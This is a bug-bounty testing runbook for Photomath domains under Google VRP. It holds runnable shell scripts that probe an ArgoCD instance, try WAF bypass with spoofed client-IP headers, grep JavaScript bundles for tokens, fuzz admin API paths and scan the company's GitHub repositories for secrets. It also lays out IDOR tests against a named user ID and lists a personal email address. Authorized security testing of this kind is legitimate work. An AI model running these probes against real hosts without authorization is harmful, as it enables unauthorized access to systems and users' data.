# Photomath Pi Runbook — Session 2

**Target:** photomath.net / photomath.com (TIER0, Google VRP)  
**Created:** 2026-06-17  
**Scope:** All targets confirmed IN-SCOPE via scope-check.sh before touching  
**Priority order:** ArgoCD auth bypass → dpcapi-admin API paths → portal IDOR → idp/glooker recon

---

## Setup

```bash
cd ~/bug-bounty-hunting-
git pull
OUTDIR=~/bug-bounty-hunting-/results/photomath.net
STAMP=$(date -u +%Y%m%d-%H%M)
mkdir -p "${OUTDIR}/evidence/session2-${STAMP}"
LOG="${OUTDIR}/evidence/session2-${STAMP}/scan.log"
exec > >(tee -a "$LOG") 2>&1
echo "=== SESSION 2 — ${STAMP} ==="
```

---

## Phase A — ArgoCD dwh-eu-dev Auth Bypass Investigation

`argocd-dwh-eu-dev.photomath.net` is the only ArgoCD instance NOT behind Google IAP.
All API paths return 403. Goal: determine if this is ArgoCD's own auth (needs creds) or IP firewall (bypassable).

### A1 — Identify auth mechanism

```bash
ARGOCD="argocd-dwh-eu-dev.photomath.net"
./scripts/scope-check.sh "${ARGOCD}" || exit 1

# Check response headers for auth clues
echo "=== Response headers ==="
curl -sk -I "https://${ARGOCD}/" | tee "${OUTDIR}/evidence/session2-${STAMP}/argocd-headers.txt"

# ArgoCD login page — if accessible, reveals auth type (OIDC provider, LDAP, etc.)
echo "=== ArgoCD login page ==="
curl -sk -L "https://${ARGOCD}/auth/login" -o /tmp/argocd-login.html 2>&1
head -100 /tmp/argocd-login.html | tee "${OUTDIR}/evidence/session2-${STAMP}/argocd-login.html"

# ArgoCD OIDC callback endpoint — returns 200 or redirect if OIDC configured
curl -sk -o /dev/null -w "%{http_code}" "https://${ARGOCD}/auth/callback"
echo " /auth/callback"

# Version endpoint — sometimes unauthenticated in ArgoCD
curl -sk "https://${ARGOCD}/api/version" | tee "${OUTDIR}/evidence/session2-${STAMP}/argocd-version.txt"

# Settings endpoint — may leak auth config without creds in some ArgoCD versions
curl -sk "https://${ARGOCD}/api/v1/settings" | tee "${OUTDIR}/evidence/session2-${STAMP}/argocd-settings.txt"
```

### A2 — WAF bypass attempts (same technique as dpcapi-admin)

```bash
echo "=== ArgoCD WAF bypass ==="
OUTFILE="${OUTDIR}/evidence/session2-${STAMP}/argocd-bypass.txt"
> "${OUTFILE}"

for HDR in \
    "X-Forwarded-For: 127.0.0.1" \
    "X-Real-IP: 127.0.0.1" \
    "X-Originating-IP: 127.0.0.1" \
    "True-Client-IP: 127.0.0.1" \
    "CF-Connecting-IP: 127.0.0.1" \
    "X-Custom-IP-Authorization: 127.0.0.1"; do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" -H "${HDR}" "https://${ARGOCD}/api/v1/settings")
    echo "${STATUS} | ${HDR}" | tee -a "${OUTFILE}"
done

# Try fetching ArgoCD API with bypass headers
for BPATH in "/api/version" "/api/v1/settings" "/api/v1/applications" "/healthz"; do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
        -H "X-Forwarded-For: 127.0.0.1" \
        -H "X-Real-IP: 127.0.0.1" \
        "https://${ARGOCD}${BPATH}")
    echo "${STATUS}: ${BPATH}" | tee -a "${OUTFILE}"
done
```

### A3 — Check if ArgoCD token is in JS bundle

```bash
# Fetch main page JS to look for tokens/passwords/OIDC client IDs
curl -sk "https://${ARGOCD}/" 2>/dev/null | \
    grep -oE 'src="[^"]+\.js[^"]*"' | sed 's/src="//;s/"//' | \
    sed "s|^/|https://${ARGOCD}/|" | \
    sort -u > /tmp/argocd-js-urls.txt

while IFS= read -r JSURL; do
    [ -z "${JSURL}" ] && continue
    curl -sk "${JSURL}" 2>/dev/null | \
        grep -oE '(clientId|client_id|issuer|oidc|password|token|secret|apiKey)["\047= :]+[A-Za-z0-9._\-]{10,}' | \
        sort -u
done < /tmp/argocd-js-urls.txt | tee "${OUTDIR}/evidence/session2-${STAMP}/argocd-js-secrets.txt"
```

### A4 — Decision

```
If /api/v1/settings returns JSON without auth → ArgoCD misconfigured: PURSUE (IDOR + app listing)
If 200 response from any path with bypass headers → WAF bypass: document + test /api/v1/applications
If 401 on API paths (vs 403) → ArgoCD own auth blocking: need credentials (lower priority)
If all 403 with headers → strict IP firewall: de-prioritize, move on
```

---

## Phase B — dpcapi-admin.photomath.com API Path Discovery

WAF bypassed via `X-Forwarded-For: 127.0.0.1` (returns 404 not 403). Server is live.
Need to find actual admin API paths.

```bash
ADMIN="dpcapi-admin.photomath.com"
./scripts/scope-check.sh "${ADMIN}" || exit 1

BYPASS_HDRS='-H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1"'
OUTFILE="${OUTDIR}/evidence/session2-${STAMP}/dpcapi-admin-paths.txt"
> "${OUTFILE}"

echo "=== dpcapi-admin path probe ==="

# DPC = Data Processing/Content — likely admin API for math solution submissions
for BPATH in \
    /health /healthz /status /ping /version \
    /api /api/v1 /api/v2 /api/v3 \
    /actuator /actuator/health /actuator/info \
    /swagger /swagger-ui /swagger-ui.html /swagger-ui/index.html \
    /openapi.json /api-docs /v2/api-docs \
    /admin /admin/login /admin/dashboard \
    /login /auth /auth/login \
    /metrics /debug \
    /graphql /graphiql \
    /dpc /dpc/api /dpc/admin \
    /content /content/api \
    /problems /solutions /quizzes \
    /users /user /experts \
    /grading /grade /grades \
    /assignments /tasks; do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
        -H "X-Forwarded-For: 127.0.0.1" \
        -H "X-Real-IP: 127.0.0.1" \
        "https://${ADMIN}${BPATH}" 2>/dev/null)
    echo "${STATUS}: ${BPATH}" | tee -a "${OUTFILE}"
    # Highlight non-404/403/000
    [ "${STATUS}" != "404" ] && [ "${STATUS}" != "403" ] && [ "${STATUS}" != "000" ] && \
        echo "[INTERESTING] ${STATUS}: ${BPATH}" | tee -a "${OUTFILE}"
done

echo ""
echo "=== Interesting dpcapi-admin responses ==="
grep "\[INTERESTING\]" "${OUTFILE}" || echo "All paths returned 404 — try wordlist"

# Fallback: ffuf wordlist if installed
if command -v ffuf &>/dev/null; then
    ffuf -u "https://${ADMIN}/FUZZ" \
        -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" \
        -w ~/wordlists/api-endpoints.txt \
        -mc 200,201,204,301,302,401,500 \
        -rate 20 -timeout 15 \
        -o "${OUTFILE/paths/ffuf}" -of json 2>/dev/null || true
fi
```

---

## Phase C — portal.photomath.net IDOR Test

Requires: two expert accounts + Burp Suite. Use browser (Pi IP blocked at TCP level).

### C1 — Account registration

```
1. Open https://portal.photomath.net/login in browser
2. Click "Sign in with Google" 
3. Register with zahinshahriar3@gmail.com → Account A (primary)
4. Register second expert account with alternative Gmail → Account B
5. Complete onboarding for both accounts to reach the qualification quiz
6. Note your quiz ID in the URL: https://portal.photomath.net/expert-training/qualification-quiz/N
```

### C2 — Burp Suite setup

```
Proxy: 127.0.0.1:8080
Target: portal.photomath.net
SSL: install Burp CA cert in browser

Enable Intercept, navigate portal as Account A:
- Home / dashboard
- Quiz page
- Solve / submission interface
- Profile / settings / earnings
```

### C3 — Capture baseline IDs (Account A session)

Look for these patterns in Burp HTTP history:
```
/api/quiz/grade-quizzes/user/{user_id}
/api/v*/users/{user_id}
/api/v*/quizzes/{quiz_id}
/api/v*/solutions/{solution_id}
/api/v*/assignments/{assignment_id}
/api/v*/cases/{case_id}
/api/v*/earnings/{user_id}
```

Target user ID already discovered: **273638** (from gau URL mining)

### C4 — IDOR test with Account B session

```
1. Log into Account B, capture session token (cookie or Authorization header)
2. In Burp Repeater: replace Account B's session with Account A's session token
3. Send GET /api/quiz/grade-quizzes/user/273638 with Account B token
4. Check: does it return data? Whose data?
5. Try Account A's quiz_id ± 1 with Account B token
6. Try low IDs (1, 2, 3, 100) for all resource types

Confirm IDOR: response contains data from another account AND differs from own-account response
```

### C5 — Check quiz ID 273638 directly

```bash
# From browser (NOT Pi) — test unauthenticated access
# Open in browser: https://portal.photomath.net/api/quiz/grade-quizzes/user/273638
# Check: does it redirect to login (expected) or return data (IDOR)?
```

---

## Phase D — New Asset Recon (idp, glooker, cms)

```bash
for HOST in idp.photomath.net glooker.photomath.net cms.photomath.net; do
    ./scripts/scope-check.sh "${HOST}" || { echo "OUT OF SCOPE: ${HOST}"; continue; }
    echo "=== ${HOST} ==="
    
    # Get full response headers
    curl -sk -I "https://${HOST}/" 2>/dev/null | head -30
    
    # Follow redirects, check final destination
    curl -sk -L -o /tmp/asset-probe.html -w "%{url_effective} -> %{http_code}" \
        "https://${HOST}/" 2>/dev/null
    echo ""
    
    # First 50 lines of response
    head -50 /tmp/asset-probe.html
    echo "---"
done | tee "${OUTDIR}/evidence/session2-${STAMP}/new-assets-probe.txt"
```

For `glooker.photomath.net` specifically (Looker BI instance):
```bash
# If glooker is a Looker instance, check for LeakyLooker patterns
# Looker API: /api/4.0/content/search?content_type=look&fields=id,title,query
# If returns data without auth → IDOR/broken auth
LOOKER="glooker.photomath.net"
for BPATH in \
    /api/4.0/content/search \
    /api/4.0/look/1 \
    /api/4.0/dashboard/1 \
    /api/4.0/user \
    /login \
    /swagger.json; do
    STATUS=$(curl -sk -o /tmp/looker-resp.txt -w "%{http_code}" "https://${LOOKER}${BPATH}")
    echo "${STATUS}: ${BPATH}"
    [ "${STATUS}" = "200" ] && head -5 /tmp/looker-resp.txt
done | tee "${OUTDIR}/evidence/session2-${STAMP}/glooker-probe.txt"
```

---

## Phase E — GitHub Secrets Scan

```bash
# List public repos
curl -s "https://api.github.com/orgs/photomath/repos?per_page=100&type=public" \
  | python3 -c "
import sys, json
try:
    for r in json.load(sys.stdin):
        print(r['full_name'], r['updated_at'], r.get('description',''))
except: pass
" | tee "${OUTDIR}/evidence/session2-${STAMP}/github-repos.txt"

# Trufflehog if installed
if command -v trufflehog &>/dev/null; then
    trufflehog github --org photomath --only-verified --json 2>/dev/null \
      | tee "${OUTDIR}/evidence/session2-${STAMP}/trufflehog.jsonl"
    SECRETS=$(wc -l < "${OUTDIR}/evidence/session2-${STAMP}/trufflehog.jsonl")
    echo "[${SECRETS} secrets found]"
fi
```

---

## Evidence Checklist

```
session2-YYYYMMDD/
  scan.log                   # All session output
  argocd-headers.txt         # Response headers from argocd-dwh-eu-dev
  argocd-login.html          # Login page HTML (auth mechanism)
  argocd-settings.txt        # /api/v1/settings response
  argocd-bypass.txt          # WAF bypass results
  argocd-js-secrets.txt      # Secrets found in ArgoCD JS bundles
  dpcapi-admin-paths.txt     # Admin API path probe results
  new-assets-probe.txt       # idp / glooker / cms probe
  glooker-probe.txt          # Looker API probe
  github-repos.txt           # Public repos list
  trufflehog.jsonl           # Secrets scan output
  [burp exports from Pi browser session — saved manually]
```

---

## Decision Matrix

| Result | Action |
|--------|--------|
| ArgoCD `/api/v1/settings` returns JSON | IDOR — list applications, clusters → Medium/High |
| ArgoCD `/api/version` returns without auth | Version disclosure → chain to known CVE |
| ArgoCD 200 with bypass headers | WAF bypass confirmed → escalate to auth bypass test |
| dpcapi-admin path returns 200/401/500 | Found live endpoint → test for auth bypass / unauth access |
| dpcapi-admin Swagger/OpenAPI accessible | Map all admin endpoints → enumerate for unauth access |
| glooker /api/4.0/user returns data | Broken auth on Looker → cross-tenant data read → High |
| portal quiz IDOR: Account B reads Account A data | IDOR → High/Critical |
| portal user ID 273638 readable without auth | Unauth IDOR → High |
| GitHub trufflehog finds verified secret | Credential exposure → High |
